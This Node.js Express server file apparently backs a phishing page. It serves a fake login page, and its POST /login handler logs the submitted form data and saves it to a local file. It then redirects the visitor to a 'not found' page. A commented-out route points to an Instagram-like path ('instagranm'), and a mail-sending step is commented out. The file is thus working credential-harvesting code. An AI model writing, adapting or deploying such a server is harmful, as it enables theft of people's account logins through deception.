var http = require('http');
var express = require('express');
var fs = require('fs');
const sendMail =  require('./mail');
const path = require('path');
var app = express();

app.use('/',express.static('public'));

app.use(express.urlencoded({
    extended:false
}));
app.use(express.json());
app.get('/', (req,res) => {
    res.sendFile(path.join(__dirname,'intro.html'))
});

app.get('/not-found', (req,res) => {
    res.sendFile(path.join(__dirname,'notfound.html'))
});

app.get('/login', (req,res) => {
    res.sendFile(path.join(__dirname,'login.html'))
});




// app.get('/', (req,res) => {
//    res.redirect('/instagranm/5bsinif/instalife/sheir/classmates/covid-19')
//   //res.sendFile(path.join(__dirname,'home.html'))
// });

app.post('/login', (req,res) => {
    console.log('Data',req.body);
    fs.writeFile('./files/file', req.body,function(){
        console.log("The file was saved!");
    }
    )
   // sendMail();
    res.redirect('/not-found')
});

 

app.listen(80, ()=>{
    console.log('server is listening')
})